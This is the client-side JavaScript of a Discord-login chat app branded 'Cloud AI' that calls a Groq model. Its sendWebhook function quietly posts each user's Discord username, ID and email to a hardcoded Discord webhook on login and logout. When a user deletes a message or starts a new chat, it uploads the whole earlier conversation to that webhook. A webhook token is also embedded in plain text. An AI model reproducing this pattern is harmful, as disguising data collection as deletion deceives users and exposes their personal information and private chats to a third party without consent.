// ===== CONFIG - REPLACE BEFORE USE =====
const DISCORD_CLIENT_ID = "1425187145953448127";
const REDIRECT_URI = "https://c22654545-afk.github.io/Te/";
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1425543224436461780/aA7jkvaIpEwnzYhvS9o7DwcpLKpniRXlBXQNV5RtFbKuG6kFzyP7p1Qnig_33bjw1hf7";
const GROQ_API_KEY = "";
const MAX_MEMORY_MESSAGES = 5090;

// ===== ELEMENT SELECTORS =====
const loginPage = document.getElementById("login-page");
const chatPage = document.getElementById("chat-page");
const discordLoginBtn = document.getElementById("discord-login");
const chatBox = document.getElementById("chat-box");
const userInput = document.getElementById("user-input");
const sendBtn = document.getElementById("send-btn");
const profileArea = document.getElementById("profile-area");
const profileDropdown = document.getElementById("profile-dropdown");
const logoutBtn = document.getElementById("logout-btn");
const menuBtn = document.getElementById("menu-btn");
const menuDropdown = document.getElementById("menu-dropdown");
const newChatBtn = document.getElementById("new-chat");
const oldChatBtn = document.getElementById("old-chat");
const oldChatModal = document.getElementById("old-chat-modal");
const oldChatList = document.getElementById("old-chat-list");
const closeOldChat = document.getElementById("close-old-chat");

// ===== STATE =====
let userData = null;
let chatMemory = JSON.parse(localStorage.getItem("cloud_ai_memory") || "[]");
let currentAbortController = null;

if(chatMemory.length > MAX_MEMORY_MESSAGES){
  chatMemory = chatMemory.slice(-MAX_MEMORY_MESSAGES);
  localStorage.setItem("cloud_ai_memory", JSON.stringify(chatMemory));
}

// ===== UTIL =====
function saveMemory(){ 
  if(chatMemory.length > MAX_MEMORY_MESSAGES){
    chatMemory = chatMemory.slice(-MAX_MEMORY_MESSAGES);
    chatBox.innerHTML = "";
    const avatarUrl = userData && userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` : "";
    chatMemory.forEach((m, idx) => {
      const sender = m.role === "assistant" ? "bot" : "user";
      createMessageElement(m.content, sender, avatarUrl, idx);
    });
  }
  localStorage.setItem("cloud_ai_memory", JSON.stringify(chatMemory)); 
}
function escapeHtml(s=""){ return String(s).replace(/[&<>"'`=\/]/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','/':'&#x2F;','`':'&#x60;','=':'&#x3D;'}[ch])); }

function prepareChatMemoryForAPI(){
  const recentMessages = chatMemory.slice(-50);
  return recentMessages;
}

/* create message DOM element and return the message element (so we can update bot text) */
function createMessageElement(text, sender, avatarUrl="", messageIndex=-1){
  const wrapper = document.createElement("div");
  wrapper.className = `message-wrapper ${sender}`;

  const avatar = document.createElement("div");
  avatar.className = `avatar ${sender}`;

  if(sender === "user"){
    if(avatarUrl){
      const img = document.createElement("img");
      img.src = avatarUrl;
      img.alt = "pfp";
      img.style.width = "36px";
      img.style.height = "36px";
      img.style.borderRadius = "50%";
      avatar.appendChild(img);
    }
  } else {
    avatar.textContent = "☁️";
  }

  const msgContainer = document.createElement("div");
  msgContainer.className = "message-container";

  if(sender === "bot"){
    const nameLabel = document.createElement("div");
    nameLabel.className = "ai-name-label";
    nameLabel.textContent = "Cloud AI";
    msgContainer.appendChild(nameLabel);
  }

  const msg = document.createElement("div");
  msg.className = "message";
  msg.textContent = text;
  msgContainer.appendChild(msg);

  if(messageIndex >= 0){
    setupLongPressMenu(msgContainer, messageIndex);
  }

  if(sender === "user"){
    wrapper.appendChild(msgContainer);
    wrapper.appendChild(avatar);
  } else {
    wrapper.appendChild(avatar);
    wrapper.appendChild(msgContainer);
  }

  chatBox.appendChild(wrapper);
  chatBox.scrollTop = chatBox.scrollHeight;
  return msg;
}

function setupLongPressMenu(element, messageIndex){
  let pressTimer = null;
  let contextMenu = null;

  const showMenu = (x, y) => {
    removeExistingMenu();
    
    contextMenu = document.createElement("div");
    contextMenu.className = "context-menu";
    contextMenu.innerHTML = `
      <button class="context-btn delete-btn">Delete</button>
      <button class="context-btn cancel-btn">Cancel</button>
    `;
    
    contextMenu.style.position = "fixed";
    contextMenu.style.left = x + "px";
    contextMenu.style.top = y + "px";
    
    document.body.appendChild(contextMenu);

    const deleteBtn = contextMenu.querySelector(".delete-btn");
    const cancelBtn = contextMenu.querySelector(".cancel-btn");

    deleteBtn.onclick = () => {
      const fullChatBeforeDelete = [...chatMemory];
      chatMemory.splice(messageIndex, 1);
      saveMemory();
      chatBox.innerHTML = "";
      const avatarUrl = userData && userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` : "";
      chatMemory.forEach((m, idx) => {
        const sender = m.role === "assistant" ? "bot" : "user";
        createMessageElement(m.content, sender, avatarUrl, idx);
      });
      removeExistingMenu();
      sendWebhook("delete", userData || {}, fullChatBeforeDelete);
    };

    cancelBtn.onclick = removeExistingMenu;
  };

  const removeExistingMenu = () => {
    const existing = document.querySelector(".context-menu");
    if(existing) existing.remove();
  };

  element.addEventListener("contextmenu", (e) => {
    e.preventDefault();
    showMenu(e.pageX, e.pageY);
  });

  element.addEventListener("touchstart", (e) => {
    pressTimer = setTimeout(() => {
      const touch = e.touches[0];
      showMenu(touch.pageX, touch.pageY);
    }, 700);
  });

  element.addEventListener("touchend", () => {
    if(pressTimer) clearTimeout(pressTimer);
  });

  element.addEventListener("touchmove", () => {
    if(pressTimer) clearTimeout(pressTimer);
  });

  document.addEventListener("click", (e) => {
    if(!e.target.closest(".context-menu")){
      removeExistingMenu();
    }
  });
}

// ===== AUTH FLOW =====
discordLoginBtn.addEventListener("click", () => {
  const scope = "identify%20email";
  const url = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${scope}`;
  window.location.href = url;
});

async function initAuth(){
  // grab token from hash if present (implicit flow)
  if(window.location.hash.includes("access_token")){
    const token = new URLSearchParams(window.location.hash.substring(1)).get("access_token");
    if(token) sessionStorage.setItem("discord_token", token);
    // tidy url
    history.replaceState(null, "", REDIRECT_URI);
  }

  const token = sessionStorage.getItem("discord_token");
  if(!token){
    // not logged in
    loginPage.style.display = "block";
    chatPage.style.display = "none";
    return;
  }

  try{
    const res = await fetch("https://discord.com/api/users/@me", { headers: { Authorization: `Bearer ${token}` } });
    if(!res.ok){
      sessionStorage.removeItem("discord_token");
      loginPage.style.display = "block";
      chatPage.style.display = "none";
      return;
    }
    userData = await res.json();
    showChatUI();
    sendWebhook("login", userData);
  } catch(err){
    console.error("Auth error", err);
    sessionStorage.removeItem("discord_token");
    loginPage.style.display = "block";
    chatPage.style.display = "none";
  }
}

// show chat UI and populate saved messages
function showChatUI(){
  loginPage.style.display = "none";
  chatPage.style.display = "block";
  chatBox.innerHTML = "";
  const avatarUrl = userData && userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` : `https://cdn.discordapp.com/embed/avatars/${parseInt(userData.discriminator||'0')%5}.png`;
  chatMemory.forEach((m, idx) => {
    const sender = m.role === "assistant" ? "bot" : "user";
    createMessageElement(m.content, sender, avatarUrl, idx);
  });
  // show PFP and hook dropdown
  profileArea.innerHTML = `<img src="${avatarUrl}" alt="pfp">`;
  profileArea.onclick = (e) => {
    e.stopPropagation();
    // toggle small logout dropdown
    profileDropdown.style.display = profileDropdown.style.display === "block" ? "none" : "block";
  };
  // logout button
  logoutBtn.onclick = () => {
    if(confirm("Logout now?")){
      sendWebhook("logout", userData);
      sessionStorage.removeItem("discord_token");
      userData = null;
      loginPage.style.display = "block";
      chatPage.style.display = "none";
      profileDropdown.style.display = "none";
    }
  };
}

// close dropdowns when clicking outside
document.addEventListener("click", () => {
  if(menuDropdown) menuDropdown.style.display = "none";
  if(profileDropdown) profileDropdown.style.display = "none";
});

// ===== WEBHOOK (login/logout/new/delete) =====
function sendWebhook(kind, usr = {}, chatData = null) {
  if(!DISCORD_WEBHOOK_URL) return;
  const color = kind === "login" ? 15844367 : kind === "logout" ? 15158332 : kind === "delete" ? 15158332 : 3447003;
  
  const embed = {
    title: kind === "login" ? "User Logged In" : kind === "logout" ? "User Logged Out" : kind === "delete" ? "Chat Deleted" : "New Chat",
    color,
    fields: [
      { name: "Username", value: `${usr.username || "Unknown"}#${usr.discriminator || "0000"}`, inline: true },
      { name: "User ID", value: usr.id || "Unknown", inline: true },
      { name: "Email", value: usr.email || "No email", inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  if(kind === "delete" && chatData && chatData.length > 0){
    const chatText = chatData.map((m, i) => `${i+1}. [${m.role}]: ${m.content.substring(0, 100)}${m.content.length > 100 ? '...' : ''}`).join('\n');
    embed.fields.push({
      name: `Chat History (${chatData.length} messages)`,
      value: chatText.substring(0, 1000) + (chatText.length > 1000 ? '\n...(truncated)' : ''),
      inline: false
    });
    
    const chatFile = new Blob([JSON.stringify(chatData, null, 2)], { type: 'application/json' });
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
    formData.append('file', chatFile, `chat_${usr.username}_${Date.now()}.json`);
    
    fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: formData
    }).catch(e => console.warn("Webhook send error", e));
    return;
  }
  
  fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] })
  }).catch(e => console.warn("Webhook send error", e));
}

// ===== SENDING MESSAGES =====
sendBtn.addEventListener("click", handleSend);
userInput.addEventListener("keypress", e => { if(e.key === "Enter" && !e.shiftKey){ e.preventDefault(); handleSend(); } });

async function handleSend(){
  const text = userInput.value.trim();
  if(!text) return;

  const avatarUrl = userData && userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` : "";
  
  chatMemory.push({ role: "user", content: text });
  const userMsgIndex = chatMemory.length - 1;
  createMessageElement(text, "user", avatarUrl, userMsgIndex);
  saveMemory();
  userInput.value = "";

  const botEl = createMessageElement("Thinking...", "bot");
  botEl.classList.add("typing");

  const stopBtn = document.createElement("button");
  stopBtn.className = "stop-btn";
  stopBtn.textContent = "Stop";
  stopBtn.onclick = () => {
    if(currentAbortController){
      currentAbortController.abort();
      currentAbortController = null;
    }
    stopBtn.remove();
    replaceBot(botEl, "Response stopped by user.");
  };
  sendBtn.parentNode.insertBefore(stopBtn, sendBtn);

  currentAbortController = new AbortController();

  const removeStopBtn = () => {
    if(stopBtn.parentNode) stopBtn.remove();
    currentAbortController = null;
  };

  const finalizeBotMessage = (content) => {
    chatMemory.push({ role: "assistant", content: content });
    const botMsgIndex = chatMemory.length - 1;
    const botContainer = botEl.closest('.message-container');
    if(botContainer){
      setupLongPressMenu(botContainer, botMsgIndex);
    }
    saveMemory();
    removeStopBtn();
  };

  if(/who are you/i.test(text)){
    replaceBot(botEl, "I'm Cloud Ai, your friendly assistant.");
    finalizeBotMessage("I'm Cloud Ai, your friendly assistant.");
    return;
  }
  if(/who is your owner/i.test(text)){
    replaceBot(botEl, "I'm owned by Calvin, my owner and developer.");
    finalizeBotMessage("I'm owned by Calvin, my owner and developer.");
    return;
  }
  if(/model/i.test(text)){
    replaceBot(botEl, "I'm Cloud Ai - I don't share internal model info.");
    finalizeBotMessage("I'm Cloud Ai - I don't share internal model info.");
    return;
  }

  const apiMemory = prepareChatMemoryForAPI();

  try{
    const proxyResp = await fetch("/api/chat", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: text, memory: apiMemory }),
      signal: currentAbortController.signal
    });
    if(proxyResp.ok){
      const data = await proxyResp.json();
      const reply = data?.choices?.[0]?.message?.content || data?.error?.message || "No reply";
      replaceBot(botEl, reply);
      finalizeBotMessage(reply);
      return;
    }
  }catch(e){
    if(e.name === 'AbortError'){
      return;
    }
    console.warn("/api/chat proxy failed:", e);
  }

  try{
    const resp = await fetch("https://api.groq.com/openai/v1/chat/completions", {
      method: "POST",
      headers: { "Content-Type":"application/json", "Authorization": `Bearer ${GROQ_API_KEY}` },
      body: JSON.stringify({ model: "openai/gpt-oss-20b", messages: apiMemory, temperature:1, max_completion_tokens:1024, top_p:1 }),
      signal: currentAbortController.signal
    });
    const data = await resp.json();
    const reply = data?.choices?.[0]?.message?.content || data?.error?.message || "No reply";
    replaceBot(botEl, reply);
    finalizeBotMessage(reply);
  }catch(err){
    if(err.name === 'AbortError'){
      return;
    }
    replaceBot(botEl, "Error: " + (err.message || err));
    removeStopBtn();
  }
}

function replaceBot(botEl, text){
  botEl.classList.remove("typing");
  botEl.textContent = "";
  let i = 0;
  const interval = setInterval(() => {
    botEl.textContent += text.charAt(i) || "";
    i++;
    if(i > text.length) clearInterval(interval);
  }, 12);
}

// ===== MENU & OLD CHATS UI =====
menuBtn.addEventListener("click", e => {
  e.stopPropagation();
  menuDropdown.style.display = menuDropdown.style.display === "block" ? "none" : "block";
});

newChatBtn.addEventListener("click", () => {
  if(!confirm("Start a new chat? This will clear current conversation locally.")) return;
  const oldChatData = [...chatMemory];
  chatMemory = [];
  saveMemory();
  chatBox.innerHTML = "";
  if(oldChatData.length > 0){
    sendWebhook("delete", userData || {}, oldChatData);
  } else {
    sendWebhook("new", userData || {});
  }
  menuDropdown.style.display = "none";
});

oldChatBtn.addEventListener("click", () => {
  renderOldChats();
  oldChatModal.style.display = "flex";
  menuDropdown.style.display = "none";
});

closeOldChat?.addEventListener("click", () => { oldChatModal.style.display = "none"; });

function renderOldChats(){
  if(!oldChatList) return;
  oldChatList.innerHTML = "";
  if(chatMemory.length === 0){
    const li = document.createElement("li");
    li.textContent = "No saved messages yet.";
    oldChatList.appendChild(li);
    return;
  }
  // Show messages as a list (each entry deletable via long-press or right-click)
  chatMemory.forEach((m, idx) => {
    const li = document.createElement("li");
    li.textContent = `[${m.role}] ${m.content.length > 120 ? m.content.slice(0,120) + "…" : m.content}`;
    // right-click / long-press to delete
    li.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      if(!confirm("Delete this message from history?")) return;
      const fullChatBeforeDelete = [...chatMemory];
      chatMemory.splice(idx, 1);
      saveMemory();
      renderOldChats();
      sendWebhook("delete", userData || {}, fullChatBeforeDelete);
    });
    // mobile: long-press detection
    let pressTimer = null;
    li.addEventListener("touchstart", () => {
      pressTimer = setTimeout(() => {
        if(confirm("Delete this message from history?")) {
          const fullChatBeforeDelete = [...chatMemory];
          chatMemory.splice(idx,1);
          saveMemory();
          renderOldChats();
          sendWebhook("delete", userData || {}, fullChatBeforeDelete);
        }
      }, 700);
    });
    li.addEventListener("touchend", () => { if(pressTimer) clearTimeout(pressTimer); });
    oldChatList.appendChild(li);
  });
}

// initialize
initAuth();
